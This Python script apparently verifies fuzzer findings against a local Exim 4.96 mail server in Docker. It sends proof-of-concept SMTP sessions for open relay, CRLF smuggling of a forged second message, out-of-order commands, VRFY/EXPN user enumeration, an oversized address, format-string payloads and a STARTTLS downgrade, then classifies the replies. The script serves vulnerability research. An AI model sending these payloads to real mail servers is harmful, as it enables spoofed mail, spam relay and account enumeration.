#!/usr/bin/env python3
"""
Exim SMTP Vulnerability Reproduction & Verification Tool
=========================================================
Reproduces violations found by LoopFuzz against Exim 4.96.
Runs PoC SMTP sessions against the exim Docker container and verifies
whether each vulnerability type is reproducible.

Vulnerability types tested:
1. Open Relay (0x0003): Mail relay without authentication
2. SMTP Smuggling (0x0420): Bare CR/LF injection in addresses
3. State Machine Violation (0x0004): RCPT before MAIL / DATA before RCPT
4. Info Leak (0x0008): VRFY/EXPN user enumeration
5. DoS/Resource Exhaust (0x00c0): Excessively long commands
6. Format String Injection (0x0020): Format specifiers in commands
7. STARTTLS Downgrade (0x0004): Cleartext after STARTTLS
"""

import socket
import time
import os
import sys
import subprocess
import json
from datetime import datetime

OUT_DIR = sys.argv[1] if len(sys.argv) > 1 else f"/tmp/exim_vuln_verification_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
SMTP_PORT = 25
DOCKER_IMAGE = "exim"

os.makedirs(OUT_DIR, exist_ok=True)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def send_smtp_session(commands, timeout_per_cmd=2.0):
    """Send a list of SMTP commands and return all responses."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect(('127.0.0.1', SMTP_PORT))
    except Exception as e:
        return [f"CONNECT_FAILED: {e}".encode()]

    # Read banner
    sock.settimeout(3)
    try:
        banner = sock.recv(8192)
    except:
        banner = b''

    responses = [(b'>>> BANNER', banner)]

    for cmd in commands:
        if isinstance(cmd, str):
            cmd = cmd.encode('latin-1', errors='replace')
        try:
            sock.settimeout(timeout_per_cmd)
            sock.sendall(cmd + b'\r\n')
            time.sleep(0.2)
            try:
                resp = sock.recv(8192)
                responses.append((cmd, resp))
            except socket.timeout:
                responses.append((cmd, b'TIMEOUT'))
        except Exception as e:
            responses.append((cmd, f'ERROR: {e}'.encode()))
            break

    # Final read
    time.sleep(0.5)
    try:
        sock.settimeout(1)
        final = sock.recv(8192)
        if final:
            responses.append((b'>>> FINAL', final))
    except:
        pass

    sock.close()
    return responses

def extract_response_codes(responses):
    """Extract 3-digit SMTP response codes from a list of responses."""
    codes = []
    for cmd, resp in responses:
        if isinstance(resp, bytes):
            resp_text = resp.decode('latin-1', errors='replace')
            for line in resp_text.split('\n'):
                line = line.strip()
                if len(line) >= 3 and line[:3].isdigit():
                    codes.append(int(line[:3]))
    return codes

def verify_open_relay(responses):
    """Verify: MAIL FROM + RCPT TO + DATA accepted without AUTH = open relay."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    has_mail_ok = any(c == 250 for c in codes)
    has_rcpt_ok = 'Accepted' in resp_text or any(c == 250 for c in codes)
    has_data_ok = any(c == 354 for c in codes)

    # Count 250 responses to MAIL and RCPT
    mail_from_250 = 0
    rcpt_to_250 = 0
    for cmd, resp in responses:
        if isinstance(cmd, bytes) and cmd.upper().startswith(b'MAIL FROM'):
            if isinstance(resp, bytes) and b'250' in resp[:20]:
                mail_from_250 += 1
        if isinstance(cmd, bytes) and cmd.upper().startswith(b'RCPT TO'):
            if isinstance(resp, bytes) and (b'250' in resp[:20] or b'251' in resp[:20]):
                rcpt_to_250 += 1

    if mail_from_250 > 0 and rcpt_to_250 > 0:
        return True, f"OPEN RELAY CONFIRMED: MAIL FROM accepted (250) + RCPT TO accepted (250/251) without AUTH"
    elif has_data_ok:
        return True, f"OPEN RELAY LIKELY: DATA accepted (354) without AUTH"
    else:
        return False, f"Not an open relay: MAIL={mail_from_250} RCPT={rcpt_to_250} DATA_354={has_data_ok}"

def verify_smuggling(responses):
    """Verify: Bare CR in address processed by server."""
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')
    codes = extract_response_codes(responses)

    # If server processed commands after the injected CR, smuggling worked
    has_250 = any(c == 250 for c in codes)
    has_accepted = 'Accepted' in resp_text
    has_error = any(c >= 500 for c in codes)

    if has_250 and has_accepted:
        return True, "SMTP SMUGGLING CONFIRMED: Server processed commands after bare CR injection"
    elif has_250:
        return True, "SMTP SMUGGLING LIKELY: Server accepted commands with bare CR in address"
    else:
        return False, f"Smuggling not confirmed (codes: {codes[:10]})"

def verify_state_violation_rcpt_before_mail(responses):
    """Verify: RCPT TO accepted before MAIL FROM."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    # Check if RCPT TO got 250 before MAIL FROM was sent
    rcpt_response_codes = []
    mail_sent = False
    for cmd, resp in responses:
        if isinstance(cmd, bytes):
            cmd_upper = cmd.upper().decode('latin-1', errors='replace')
            if cmd_upper.startswith('MAIL FROM'):
                mail_sent = True
            if cmd_upper.startswith('RCPT TO') and not mail_sent:
                if isinstance(resp, bytes):
                    for line in resp.decode('latin-1', errors='replace').split('\n'):
                        line = line.strip()
                        if len(line) >= 3 and line[:3].isdigit():
                            rcpt_response_codes.append(int(line[:3]))

    if any(c >= 200 and c < 400 for c in rcpt_response_codes):
        return True, f"STATE VIOLATION CONFIRMED: RCPT TO accepted before MAIL FROM (codes: {rcpt_response_codes})"
    elif any(c >= 500 for c in rcpt_response_codes):
        return False, f"RCPT before MAIL correctly rejected: {rcpt_response_codes}"
    else:
        return False, f"RCPT before MAIL: inconclusive (codes: {rcpt_response_codes})"

def verify_state_violation_data_before_rcpt(responses):
    """Verify: DATA accepted before RCPT TO."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    # Check if DATA got 354 before any RCPT TO
    data_354 = False
    rcpt_sent = False
    for cmd, resp in responses:
        if isinstance(cmd, bytes):
            cmd_upper = cmd.upper().decode('latin-1', errors='replace')
            if cmd_upper.startswith('RCPT TO'):
                rcpt_sent = True
            if cmd_upper.startswith('DATA') and not rcpt_sent:
                if isinstance(resp, bytes) and b'354' in resp[:20]:
                    data_354 = True

    if data_354:
        return True, "STATE VIOLATION CONFIRMED: DATA accepted (354) before RCPT TO"
    elif '503' in resp_text:
        return False, "DATA before RCPT correctly rejected (503)"
    else:
        return False, "DATA before RCPT: inconclusive"

def verify_info_leak_vrfy(responses):
    """Verify: VRFY/EXPN returns user information."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    # VRFY/EXPN success codes: 250, 252
    vrfy_ok = False
    for cmd, resp in responses:
        if isinstance(cmd, bytes):
            cmd_upper = cmd.upper().decode('latin-1', errors='replace')
            if cmd_upper.startswith('VRFY') or cmd_upper.startswith('EXPN'):
                if isinstance(resp, bytes):
                    resp_str = resp.decode('latin-1', errors='replace')
                    for line in resp_str.split('\n'):
                        line = line.strip()
                        if len(line) >= 3 and line[:3].isdigit():
                            code = int(line[:3])
                            if code in (250, 252):
                                vrfy_ok = True
                                break

    if vrfy_ok:
        return True, "INFO LEAK CONFIRMED: VRFY/EXPN returned user information (250/252)"
    elif any(c in (550, 551, 553) for c in codes):
        return False, "VRFY/EXPN correctly rejected (550/551/553)"
    else:
        return False, f"VRFY/EXPN: inconclusive (codes: {codes[:10]})"

def verify_long_cmd(responses):
    """Verify: Excessively long command handling."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    # If server didn't crash but responded, check if it truncated/processed
    if any(c >= 500 for c in codes):
        return False, f"Long command correctly rejected (5xx error)"
    elif any(c >= 200 and c < 400 for c in codes):
        return True, f"DoS RISK: Long command accepted ({len(resp_text)} bytes response) - potential memory exhaustion"
    else:
        return False, "Long command: inconclusive"

def verify_format_string(responses):
    """Verify: Format string specifiers in commands."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    # Check if commands with %n%s%x were accepted
    if any(c >= 200 and c < 400 for c in codes):
        return True, "FORMAT STRING RISK: Commands with format specifiers (%n/%s/%x) accepted"
    else:
        return False, f"Format string commands rejected (codes: {codes[:10]})"

def verify_starttls_downgrade(responses):
    """Verify: Cleartext commands accepted after STARTTLS."""
    codes = extract_response_codes(responses)
    resp_text = b'\n'.join(r for _, r in responses if isinstance(r, bytes)).decode('latin-1', errors='replace')

    # Check if MAIL FROM was accepted with 250 after STARTTLS (without actual TLS)
    starttls_seen = False
    mail_after_starttls = False
    for cmd, resp in responses:
        if isinstance(cmd, bytes):
            cmd_upper = cmd.upper().decode('latin-1', errors='replace')
            if cmd_upper.startswith('STARTTLS'):
                if isinstance(resp, bytes) and b'220' in resp[:20]:
                    starttls_seen = True
            if starttls_seen and cmd_upper.startswith('MAIL FROM'):
                if isinstance(resp, bytes) and b'250' in resp[:20]:
                    mail_after_starttls = True

    if mail_after_starttls:
        return True, "STARTTLS DOWNGRADE CONFIRMED: Cleartext MAIL FROM accepted after STARTTLS (STRIPTLS)"
    elif starttls_seen:
        return False, "STARTTLS handled correctly: cleartext commands rejected after STARTTLS"
    else:
        return False, "STARTTLS: server didn't offer/accept STARTTLS"


# ==============================================================================
# Main Test Suite
# ==============================================================================

def run_test(name, commands, expected_cat, verify_func):
    """Run a single test case."""
    log(f"{'='*60}")
    log(f"TEST: {name}")
    log(f"Expected category: {expected_cat}")

    # Start docker container
    log("Starting exim Docker container...")
    docker_cmd = [
        "docker", "run", "--rm", "--network", "host", "--cap-add", "SYS_PTRACE",
        "-e", "ASAN_OPTIONS=abort_on_error=1:symbolize=0:detect_leaks=0",
        DOCKER_IMAGE,
        "/bin/bash", "-c",
        "mkdir -p /var/lock /var/log /usr/exim/bin; "
        "cp ./src/build-Linux-x86_64/exim /usr/exim/bin/exim 2>/dev/null; "
        "/home/ubuntu/experiments/clean 2>/dev/null; "
        "killall exim 2>/dev/null || true; "
        "exim -bd -oX 25 -oP /var/lock/exim.pid & "
        "sleep 3; "
        "nc -z 127.0.0.1 25 && echo 'READY' || echo 'NOT_READY'; "
        "sleep 999999"  # keep alive
    ]

    proc = subprocess.Popen(docker_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)

    # Check if server is ready
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(3)
        test_sock.connect(('127.0.0.1', SMTP_PORT))
        banner = test_sock.recv(1024)
        test_sock.close()
        log(f"Server ready. Banner: {banner[:100].decode('latin-1', errors='replace')}")
    except Exception as e:
        log(f"ERROR: Server not ready: {e}")
        proc.kill()
        proc.wait()
        return {"name": name, "status": "SERVER_NOT_READY", "error": str(e)}

    # Send PoC
    log(f"Sending {len(commands)} SMTP commands...")
    responses = send_smtp_session(commands)

    # Verify
    confirmed, detail = verify_func(responses)

    # Kill docker
    proc.kill()
    try:
        proc.wait(timeout=5)
    except:
        pass

    # Save responses
    resp_file = os.path.join(OUT_DIR, f"{name}_responses.txt")
    with open(resp_file, 'w') as f:
        for cmd, resp in responses:
            if isinstance(cmd, bytes):
                cmd_str = cmd.decode('latin-1', errors='replace')
            else:
                cmd_str = str(cmd)
            if isinstance(resp, bytes):
                resp_str = resp.decode('latin-1', errors='replace')
            else:
                resp_str = str(resp)
            f.write(f">>> {cmd_str}\n{resp_str}\n\n")

    result = {
        "name": name,
        "expected_category": expected_cat,
        "confirmed": confirmed,
        "detail": detail,
        "response_file": resp_file,
        "num_commands": len(commands),
        "response_codes": extract_response_codes(responses),
    }

    status = "✅ CONFIRMED" if confirmed else "❌ NOT REPRODUCED"
    log(f"RESULT: {status}")
    log(f"Detail: {detail}")
    return result


# ==============================================================================
# Test Cases
# ==============================================================================

test_cases = [
    {
        "name": "poc1_open_relay",
        "expected_cat": "0x0003 (AUTH_BYPASS|AUTHZ_BYPASS)",
        "commands": [
            "EHLO test.example.com",
            "MAIL FROM:<attacker@evil.com>",
            "RCPT TO:<victim@target.com>",
            "DATA",
            "From: attacker@evil.com",
            "To: victim@target.com",
            "Subject: Open Relay Test",
            "",
            "This email was sent without authentication!",
            ".",
            "QUIT",
        ],
        "verify": verify_open_relay,
    },
    {
        "name": "poc2_smtp_smuggling",
        "expected_cat": "0x0420 (SMUGGLING|INJECTION)",
        "commands": [
            "EHLO test.example.com",
            "MAIL FROM:<legit@good.com>\r\nRCPT TO:<victim@target.com>\r\nDATA\r\nFrom: forged@evil.com\r\nTo: victim@target.com\r\nSubject: Smuggled\r\n\r\nSmuggled body\r\n.\r\n",
            "QUIT",
        ],
        "verify": verify_smuggling,
    },
    {
        "name": "poc3_rcpt_before_mail",
        "expected_cat": "0x0004 (STATE_VIOLATION)",
        "commands": [
            "EHLO test.example.com",
            "RCPT TO:<test@example.com>",
            "MAIL FROM:<test@example.com>",
            "QUIT",
        ],
        "verify": verify_state_violation_rcpt_before_mail,
    },
    {
        "name": "poc4_data_before_rcpt",
        "expected_cat": "0x0004 (STATE_VIOLATION)",
        "commands": [
            "EHLO test.example.com",
            "MAIL FROM:<test@example.com>",
            "DATA",
            "From: test@example.com",
            "To: test@example.com",
            "Subject: Test",
            "",
            "Body without RCPT",
            ".",
            "QUIT",
        ],
        "verify": verify_state_violation_data_before_rcpt,
    },
    {
        "name": "poc5_vrfy_expr_info_leak",
        "expected_cat": "0x0008 (INFO_LEAK)",
        "commands": [
            "EHLO test.example.com",
            "VRFY root",
            "EXPN root",
            "VRFY admin",
            "EXPN admin",
            "VRFY nobody",
            "VRFY postmaster",
            "QUIT",
        ],
        "verify": verify_info_leak_vrfy,
    },
    {
        "name": "poc6_long_command",
        "expected_cat": "0x00c0 (DOS|RESOURCE_EXHAUST)",
        "commands": [
            "EHLO test.example.com",
            f"MAIL FROM:<{'A'*5000}@example.com>",
            "QUIT",
        ],
        "verify": verify_long_cmd,
    },
    {
        "name": "poc7_format_string",
        "expected_cat": "0x0020 (INJECTION)",
        "commands": [
            "EHLO %n%n%n.example.com",
            "MAIL FROM:<%s%s%s@evil.com>",
            "RCPT TO:<%x%x%x@target.com>",
            "QUIT",
        ],
        "verify": verify_format_string,
    },
    {
        "name": "poc8_starttls_downgrade",
        "expected_cat": "0x0004 (STATE_VIOLATION - STARTTLS downgrade)",
        "commands": [
            "EHLO test.example.com",
            "STARTTLS",
            "MAIL FROM:<test@example.com>",
            "RCPT TO:<test@example.com>",
            "QUIT",
        ],
        "verify": verify_starttls_downgrade,
    },
]

# ==============================================================================
# Run All Tests
# ==============================================================================

log("=" * 70)
log("EXIM SMTP VULNERABILITY REPRODUCTION SUITE")
log(f"Target: Exim 4.96-221-d6a5a05b8-XX (Docker: {DOCKER_IMAGE})")
log(f"Output: {OUT_DIR}")
log("=" * 70)

results = []
for tc in test_cases:
    try:
        result = run_test(tc["name"], tc["commands"], tc["expected_cat"], tc["verify"])
        results.append(result)
    except Exception as e:
        log(f"ERROR in {tc['name']}: {e}")
        results.append({"name": tc["name"], "status": "ERROR", "error": str(e)})
    time.sleep(2)  # Small delay between tests

# ==============================================================================
# Summary
# ==============================================================================

log("")
log("=" * 70)
log("REPRODUCTION SUMMARY")
log("=" * 70)

confirmed_count = 0
for r in results:
    if r.get("confirmed"):
        confirmed_count += 1
        log(f"  ✅ {r['name']}: CONFIRMED - {r.get('detail', 'N/A')}")
    else:
        log(f"  ❌ {r['name']}: NOT REPRODUCED - {r.get('detail', 'N/A')}")

log(f"\nTotal confirmed: {confirmed_count}/{len(results)}")

# Save full results
results_file = os.path.join(OUT_DIR, "reproduction_results.json")
with open(results_file, 'w') as f:
    json.dump(results, f, indent=2, default=str)

log(f"Full results saved to: {results_file}")
log(f"Response files in: {OUT_DIR}")